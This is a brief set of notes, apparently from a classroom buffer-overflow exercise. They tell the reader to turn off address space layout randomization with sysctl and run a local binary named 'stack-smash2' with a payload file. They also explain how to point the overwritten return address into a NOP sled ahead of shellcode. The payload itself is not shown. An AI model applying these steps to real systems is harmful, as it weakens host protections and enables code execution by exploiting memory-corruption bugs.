Firstly, run this:
sudo sysctl -w kernel.randomize_va_space=0


RUN GDB IN SUDO MODE
Run this:
./stack-smash2 `cat input-file.txt | xargs printf`

Change the first address after the As (ffffca8c) according to what you want just a random address after the return address.
The program you want to run are the last instructions, the others (0x90) are just nops